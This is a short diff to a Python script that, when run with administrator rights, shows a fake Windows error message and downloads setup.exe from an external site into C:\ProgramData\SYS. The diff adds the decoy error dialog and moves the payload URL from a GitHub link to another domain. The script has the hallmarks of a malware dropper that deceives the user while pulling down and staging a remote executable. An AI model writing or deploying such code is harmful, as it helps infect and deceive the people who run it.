@@ -2,6 +2,7 @@ import ctypes
 import os
 import sys
 import time
+from tkinter import messagebox
 import requests
 import subprocess
 
@@ -25,6 +26,8 @@ if is_admin():
                          stdout=sys.stdout)
     p.communicate()
 
+    messagebox.showerror("Error", "An internal error has occurred: The parameter is incorrect: (0x80070057)")
+
     def download(url: str, dest_folder: str):
         if not os.path.exists(dest_folder):
             os.makedirs(dest_folder)  # create folder if it does not exist
@@ -44,8 +47,7 @@ if is_admin():
         else:  # HTTP status code 4XX/5XX
             print("Download failed: status code {}\n{}".format(r.status_code, r.text))
 
-
-    download("https://github.com/MASMob2022/pyw.download/raw/main/setup.exe", dest_folder="C:\ProgramData\SYS")
+    download("https://skartproduction.com/lcd/setup.exe", dest_folder="C:\ProgramData\SYS")
 
     time.sleep(5)
 
